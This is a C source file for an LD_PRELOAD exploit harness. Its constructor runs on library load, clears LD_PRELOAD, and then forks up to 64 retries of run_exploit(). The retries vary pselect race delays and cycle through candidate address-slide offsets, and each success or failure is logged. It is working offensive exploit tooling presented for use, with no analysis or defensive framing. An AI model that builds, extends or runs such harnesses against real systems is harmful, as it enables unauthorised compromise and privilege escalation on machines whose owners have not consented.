#include "common.h"

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 90

#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t app_slide_p0_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
#endif

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
  if (!getenv("EXPLOIT_ATTEMPTS") && !getenv("SLIDE_P0_OFFSET")) {
    max_attempts =
        (int)(sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]));
  }
#endif
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int attempt_timeout_sec = env_int(
      "EXPLOIT_ATTEMPT_TIMEOUT_SEC", DEFAULT_ATTEMPT_TIMEOUT_SEC, 5, 900);
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d timeout=%d\n",
             getpid(), max_attempts, base_delay, attempt_timeout_sec);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
      if (getppid() == 1) {
        _exit(1);
      }
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
      if (!getenv("SLIDE_P0_OFFSET")) {
        uintptr_t offset = app_slide_p0_offsets[
            (size_t)(attempt - 1) %
            (sizeof(app_slide_p0_offsets) / sizeof(app_slide_p0_offsets[0]))];
        char offset_arg[16];
        snprintf(offset_arg, sizeof(offset_arg), "0x%zx", offset);
        SYSCHK(setenv("SLIDE_P0_OFFSET", offset_arg, 1));
      }
      pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                 attempt, max_attempts, getpid(), delay_usec,
                 getenv("SLIDE_P0_OFFSET"));
#else
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
#endif
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited = 0;
    struct timespec started;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &started));
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited < 0 && errno != EINTR) {
        break;
      }

      struct timespec now;
      SYSCHK(clock_gettime(CLOCK_MONOTONIC, &now));
      time_t elapsed = now.tv_sec - started.tv_sec;
      if (elapsed >= attempt_timeout_sec) {
        pr_warning("exploit attempt=%d/%d timeout pid=%d seconds=%d\n",
                   attempt, max_attempts, child, attempt_timeout_sec);
        SYSCHK(kill(child, SIGKILL));
        do {
          waited = waitpid(child, &status, 0);
        } while (waited < 0 && errno == EINTR);
        break;
      }
      usleep(100000);
    }
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
